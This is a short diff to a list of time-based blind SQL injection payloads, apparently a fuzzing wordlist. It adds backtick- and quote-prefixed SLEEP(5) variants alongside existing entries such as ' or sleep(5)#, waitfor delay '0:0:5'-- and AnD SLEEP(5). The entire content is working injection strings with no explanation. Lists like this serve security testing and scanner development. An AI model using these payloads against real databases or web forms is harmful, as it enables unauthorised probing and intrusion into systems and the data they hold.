@@ -1,8 +1,11 @@
 sleep(5)#
+`SLEEP(5)
+'SLEEP(5)
 " or sleep(5)#
 ' or sleep(5)#
 " or sleep(5)="
 ' or sleep(5)='
+` or sleep(5)
 ");waitfor delay '0:0:5'--
 ));waitfor delay '0:0:5'--
 '));waitfor delay '0:0:5'--
@@ -11,6 +14,7 @@ sleep(5)#
 AnD SLEEP(5)
 AnD SLEEP(5)--
 AnD SLEEP(5)#
+`AnD SLEEP(5)
 &&SLEEP(5)
 &&SLEEP(5)--
 &&SLEEP(5)#
